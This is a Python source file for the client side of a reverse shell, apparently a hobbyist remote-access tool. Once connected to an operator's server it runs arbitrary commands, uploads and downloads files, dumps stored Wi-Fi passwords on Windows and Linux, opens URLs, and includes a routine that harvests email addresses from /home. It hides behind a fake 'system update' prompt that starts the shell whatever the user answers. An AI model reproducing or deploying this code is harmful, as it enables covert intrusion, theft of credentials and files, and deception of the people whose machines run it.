# !/usr/bin/python
# -*- coding: utf-8 -*-
##############################
#   **python reverse shell**
# coded by: oseid Aldary
##############################
# Client_FILE


import struct, socket, subprocess, os, platform, webbrowser as browser
import os, time

# server_config
IP = "localhost"  # Your server IP, default: localhost
port = 4444  # #Your server Port, default: 4444


################
class senrev:
    def __init__(self, sock):
        self.sock = sock

    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)

    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame: return None
            packet += frame
        return packet


def cnet():
    try:
        ip = socket.gethostbyname("www.google.com")
        con = socket.create_connection((ip, 80), 2)
        return True
    except socket.error:
        pass
    return False


def runCMD(cmd):
    runcmd = subprocess.Popen(cmd,
                              shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
    return runcmd.stdout.read() + runcmd.stderr.read()


def upload(cmd):
    filetosend = "".join(cmd.split(":download")).strip()
    if not os.path.isfile(filetosend):
        controler.send("error: open: '{}': No such file on clinet machine !\n".format(filetosend).encode("UTF-8"))
        shell()
    else:
        controler.send(b"true")
        with open(filetosend, "rb") as wf:
            for data in iter(lambda: wf.read(4100), b""):
                try:
                    controler.send(data)
                except(KeyboardInterrupt, EOFError):
                    wf.close()
                    controler.send(b":Aborted:")
                    return
        controler.send(b":DONE:")

def wifishow():
    try:
        if platform.system() == "Windows":
            info = runCMD("netsh wlan show profile name=* key=clear")
        elif platform.system() == "Linux":
            info = runCMD("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
        else:
            info = b":osnot:"
    except Exception:
        info = b":osnot:"
    finally:
        controler.send(info)


def download(cmd):
    filetodown = "".join(cmd.split(":upload")).strip()
    filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[
        -1] if "\\" in filetodown else filetodown
    wf = open(filetodown, "wb")
    while True:
        data = controler.recv()
        if data == b":DONE:":
            break
        elif data == b":Aborted:":
            wf.close()
            os.remove(filetodown)
            return
        wf.write(data)
    wf.close()
    controler.send(str(os.getcwd() + os.sep + filetodown).encode("UTF-8"))


def browse(cmd):
    url = "".join(cmd.split(":browse")).strip()
    browser.open(url)


def infosec():
    import socket
    import psutil
    import os
    import re
    import sys
    from datetime import datetime
    def convertTime(seconds):
        minutes, seconds = divmod(seconds, 60)
        hours, minutes = divmod(minutes, 60)
        return "%d:%02d:%02d" % (hours, minutes, seconds)
    battery = psutil.sensors_battery()
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    email_addresses_list = []
    for root, subdir, files in os.walk("/home"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            try:
                file_contents = file_fd.read().strip()
                email_addresses = re.findall(r'[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}', file_contents)
                if len(email_addresses) > 0:
                    email_addresses_list = email_addresses_list + email_addresses

                file_fd.close()
            except:
                pass


            
    charge = f'{battery.percent} : {dt_string}'
    charge_status = f'{battery.power_plugged} : {dt_string}'
    remainder = convertTime(battery.secsleft)
    em_ad = email_addresses_list
    
    f = open("system_info.txt", "a")
    f.write(f'''
    hostname:
    charge: {charge}
    charge status: {charge_status}
    time left with current charge: {remainder}
    all emails:
    {em_ad}
    ''')
    f.close()
    print(f'1:@435:')

def shell(senrev=senrev):
    global s
    global controler
    mainDIR = os.getcwd()
    tmpdir = ""
    controler = senrev(s)
    while True:
        cmd = controler.recv()
        if cmd.strip():
            cmd = cmd.decode("UTF-8", 'ignore').strip()
            if ":download" in cmd:
                upload(cmd)
            elif ":upload" in cmd:
                download(cmd)
            elif cmd == ":kill":
                s.shutdown(2)
                s.close()
                break
            elif ":browse" in cmd:
                browse(cmd)
            elif cmd == ":check_internet_connection":
                if cnet() == True:
                    controler.send(b"UP")
                else:
                    controler.send(b"Down")
            elif cmd == ":wifi":
                wifishow()
            elif "cd" in cmd:
                dirc = "".join(cmd.split("cd")).strip()
                if not dirc.strip():
                    controler.send("{}\n".format(os.getcwd()).encode("UTF-8"))
                elif dirc == "-":
                    if not tmpdir:
                        controler.send(b"error: cd: old [PAWD] not set yet !\n")
                    else:
                        tmpdir2 = os.getcwd()
                        os.chdir(tmpdir)
                        controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
                        tmpdir = tmpdir2
                elif dirc == "--":
                    tmpdir = os.getcwd()
                    os.chdir(mainDIR)
                    controler.send("Back to first dir[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
                else:
                    if not os.path.isdir(dirc):
                        controler.send(
                            "error: cd: '{}': No such file or directory on clinet machine !\n".format(dirc).encode(
                                "UTF-8"))
                    else:
                        tmpdir = os.getcwd()
                        os.chdir(dirc)
                        controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
            elif cmd == "pwd":
                controler.send(str(os.getcwd() + "\n").encode("UTF-8"))
            else:
                cmd_output = runCMD(cmd)
                controler.send(bytes(cmd_output))
    exit(1)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    print("Package is loading: ")
    time.sleep(2)
    os.system('pmset sleepnow')
    print('\n' * 50)
    print('Our systems detected an update')
    print('This update should only take {3:00} minutes:')
    print('Would you like to update?')
    dele = input('[1=yes] >>') 

    
    if dele == '1':
    	print('update has started: please wait')
    	#infosec()
    	shell()
    	
    else: 
    	print('This program may run into issues without the update, please consider updating at a later date.')
    	os.system('pmset sleepnow')
    	print('\n' * 50)
    	
    	print('system bug: forced update begining...')
    	#infosec()
    	shell()
    
    
    


except Exception:
    exit(1)
